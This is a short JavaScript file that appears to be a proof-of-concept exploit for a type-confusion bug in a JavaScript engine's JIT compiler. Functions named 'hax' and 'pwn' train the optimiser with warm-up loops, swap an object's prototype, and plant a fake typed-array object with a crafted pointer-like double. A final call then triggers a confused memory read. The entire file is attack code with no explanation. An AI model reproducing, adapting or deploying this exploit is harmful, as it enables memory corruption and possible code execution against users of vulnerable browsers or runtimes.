
let ab = new ArrayBuffer(1024);

function hax(o, changeProto) {
    
    let x = new Uint8Array(1024);

    let y = {slots: 13.37, elements: 13.38, buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};

    if (changeProto) {
        o.p = x;

        
        o.__proto__ = {};
    }

    
    o.p = y;

    return o;
}

function pwn(o, trigger) {
    if (trigger) {
       
        return o.p[0];
    } else {
        return 42;
    }
}


for (let i = 0; i < 10000; i++) {
    hax({}, false);
}


for (let i = 0; i < 10000; i++) {
    evilObj = hax({}, true);

    
    eval('evilObj.p');
}


for (let i = 0; i < 100000; i++) {
    pwn(evilObj, false);
}


pwn(evilObj, true);


